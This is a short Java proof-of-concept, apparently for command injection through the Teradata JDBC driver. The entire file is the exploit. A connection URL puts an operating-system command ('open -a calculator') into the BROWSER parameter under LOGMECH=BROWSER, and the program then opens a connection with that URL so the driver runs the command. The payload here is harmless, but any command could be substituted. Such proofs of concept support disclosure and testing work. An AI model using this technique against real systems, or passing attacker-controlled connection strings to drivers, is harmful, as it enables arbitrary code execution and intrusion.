package teradata;

import java.sql.DriverManager;

public class TeradataAttack {
    public static void main(String[] args) throws Exception {
        String jdbcUrl = "jdbc:teradata://127.0.0.1/DBS_PORT=10250,LOGMECH=BROWSER,BROWSER='open -a calculator',TYPE=DEFAULT,COP=OFF,TMODE=TERA,LOG=DEBUG";
        connect(jdbcUrl);
    }

    public static void connect(String jdbcUrl) throws Exception {
        DriverManager.registerDriver(new com.teradata.jdbc.TeraDriver());
        DriverManager.getConnection(jdbcUrl);
    }
}
